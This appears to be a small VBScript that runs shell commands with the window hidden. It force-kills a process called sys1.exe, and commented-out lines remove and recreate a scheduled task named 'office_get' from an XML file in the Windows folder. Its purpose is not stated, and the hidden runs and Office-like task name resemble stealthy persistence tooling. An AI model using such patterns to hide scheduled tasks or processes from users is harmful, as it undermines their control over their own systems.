Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
With CreateObject("WScript.Shell")
     
    ' Pass 0 as the second parameter to hide the window...
    '.Run "schtasks /delete /tn office_get /F", 0, True
    '.Run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F", 0, True
    .Run "taskkill /f /im sys1.exe", 0, True
    
End With


